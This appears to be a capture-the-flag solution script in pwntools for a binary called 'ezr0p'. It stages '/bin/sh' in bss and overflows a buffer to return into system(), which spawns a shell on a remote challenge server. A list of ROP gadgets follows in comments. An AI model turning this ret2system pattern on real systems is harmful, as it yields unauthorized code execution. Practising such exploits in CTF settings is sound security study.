from pwn import *
context(log_level='debug',arch='amd64',os='linux',terminal=['tmux','splitw','-h'])


# io=process("./ezr0p")
io=remote("43.142.108.3",28351)
elf=ELF("./ezr0p")
# io=remote("",)

sys_addr=elf.sym[b"system"]
bss_addr=0x804A080


io.recvuntil(b"name\n")
payload=b"/bin/sh"
io.send(payload)

io.recvuntil("time~\n")
payload=cyclic(0x1c+0x4)+p32(sys_addr)+p32(0)+p32(bss_addr)
io.sendline(payload)
io.interactive()


# Gadgets information
# ============================================================
# 0x080484d7 : mov al, byte ptr [0xc9010804] ; ret
# 0x08048381 : mov ebx, 0x81000000 ; ret
# 0x08048440 : mov ebx, dword ptr [esp] ; ret
# 0x0804864b : pop ebp ; ret
# 0x08048648 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
# 0x0804839d : pop ebx ; ret
# 0x0804864a : pop edi ; pop ebp ; ret
# 0x08048649 : pop esi ; pop edi ; pop ebp ; ret
# 0x08048386 : ret
# 0x0804848e : ret 0xeac1

# Unique gadgets found: 10